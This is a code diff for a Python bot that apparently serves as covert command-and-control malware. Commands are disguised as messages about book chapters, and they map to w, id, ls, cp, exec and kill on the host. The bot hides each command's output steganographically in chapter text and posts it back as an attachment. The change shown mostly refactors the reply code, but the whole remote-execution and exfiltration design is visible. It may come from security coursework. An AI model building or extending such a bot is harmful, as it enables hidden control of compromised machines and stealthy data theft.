@@ -53,6 +53,18 @@ def process_exec(file_path):
     return 'File does not exist'
 
 
+def send_reply(cmd, chapter_n, result, reply_to, reply_text):
+    print(f'>>> {cmd} reply:\n{result}', flush=True)
+
+    chapter = read_chapter(chapter_n)
+    encoded, encoded_len = encode_to_text(result, chapter)
+    attachment = {
+        'name': str(uuid.uuid4()) + '.txt',
+        'content': encoded[0:int(encoded_len*1.2)],
+    }
+    add_message(reply_text, BOT_NICK_NAME, reply_to=reply_to, attachment=attachment)
+
+
 def process_msg(sender, msg_id, msg, attachment):
     if len(msg) == 0 or sender != CONTROLLER_NICK_NAME:
         print('>>> Message is not a command', flush=True)
@@ -63,32 +75,24 @@ def process_msg(sender, msg_id, msg, attachment):
         print('>>> Heartbeat, bot is running', flush=True)
 
     elif msg.startswith('Send me text of chapter '):
-        chapter_num = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
-        cmd = get_command_for_chapter(chapter_num)
+        chapter_n = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
+        cmd = get_command_for_chapter(chapter_n)
 
         if cmd == 'w':
             result = process_who()
-            print(f'>>> w reply: {result}', flush=True)
         elif cmd == 'id':
             result = process_id()
-            print(f'>>> id reply: {result}', flush=True)
         elif cmd == 'kill':
             return 'kill'
         else:
             print(f'>>> Invalid command: "{cmd}" without attachment', flush=True)
             return
 
-        chapter = read_chapter(chapter_num)
-        encoded, encoded_len = encode_to_text(result, chapter)
-        attachment = {
-            'name': str(uuid.uuid4()) + '.txt',
-            'content': encoded[0:int(encoded_len*1.2)],
-        }
-        add_message('Text of the chapter is in the attachment', BOT_NICK_NAME, reply_to=msg_id, attachment=attachment)
+        send_reply(cmd, chapter_n, result, msg_id, 'Text of the chapter is in the attachment')
 
     elif msg.startswith('Is this attachment part of chapter '):
-        chapter_num = int(msg[35]) if msg[36] == '?' else int(msg[35:37])
-        cmd = get_command_for_chapter(chapter_num)
+        chapter_n = int(msg[35]) if msg[36] == '?' else int(msg[35:37])
+        cmd = get_command_for_chapter(chapter_n)
 
         if attachment is None:
             print(f'>>> Invalid command: No attachment for "{cmd}"', flush=True)
@@ -99,27 +103,15 @@ def process_msg(sender, msg_id, msg, attachment):
 
         if cmd == 'ls':
             result = process_ls(decoded)
-            print(f'>>> ls reply: {result}', flush=True)
         elif cmd == 'cp':
             result = process_cp(decoded)
-            print(f'>>> cp reply: {result}', flush=True)
         elif cmd == 'exec':
             result = process_exec(decoded)
-            print(f'>>> exec reply: {result}', flush=True)
         else:
             print(f'>>> Invalid command: "{cmd}" with attachment', flush=True)
             return
 
-        chapter = read_chapter(chapter_num)
-        encoded, encoded_len = encode_to_text(result, chapter)
-        attachment = {
-            'name': str(uuid.uuid4()) + '.txt',
-            'content': encoded[0:int(encoded_len*1.2)],
-        }
-        add_message(
-            f'No, it is not, I send the chapter {chapter_num} in the attachment',
-            BOT_NICK_NAME, reply_to=msg_id, attachment=attachment
-        )
+        send_reply(cmd, chapter_n, result, msg_id, f'No, it is not, I send the chapter {chapter_n} in the attachment')
 
     else:
         print(f'>>> Unknown command: "{msg}"', flush=True)
